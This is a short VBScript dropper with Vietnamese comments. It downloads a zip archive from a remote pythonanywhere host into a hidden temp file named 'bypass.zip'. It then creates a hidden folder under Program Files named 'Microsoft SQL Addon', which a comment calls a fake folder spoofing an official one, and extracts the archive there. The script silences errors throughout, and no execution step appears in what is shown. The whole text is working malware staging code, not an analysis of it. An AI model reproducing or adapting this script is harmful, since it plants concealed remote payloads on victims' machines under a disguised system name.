On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

' lấy path đến temp và program files
temp = objShell.ExpandEnvironmentStrings("%TEMP%")
programFiles = objShell.ExpandEnvironmentStrings("%ProgramFiles%")

' def links
zipUrl = "https://bndevbeingexisted.pythonanywhere.com/download/BAM.zip"
zipPath = temp & "\bypass.zip"
newFolderPath = programFiles & "\Microsoft SQL Addon"

' fetch zip
objHTTP.Open "GET", zipUrl, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile zipPath, 2
    objStream.Close
    objFSO.GetFile(zipPath).Attributes = objFSO.GetFile(zipPath).Attributes Or 2
End If

' tạo folder fake spoof folder oficial
If Not objFSO.FolderExists(newFolderPath) Then
    Set newFolder = objFSO.CreateFolder(newFolderPath)
    newFolder.Attributes = newFolder.Attributes Or 2
End If

' extract
Set objZip = CreateObject("Shell.Application")
Set objFolder = objZip.NameSpace(zipPath)
If Not objFolder Is Nothing Then
    objZip.NameSpace(newFolderPath).CopyHere objFolder.Items, 16
End If
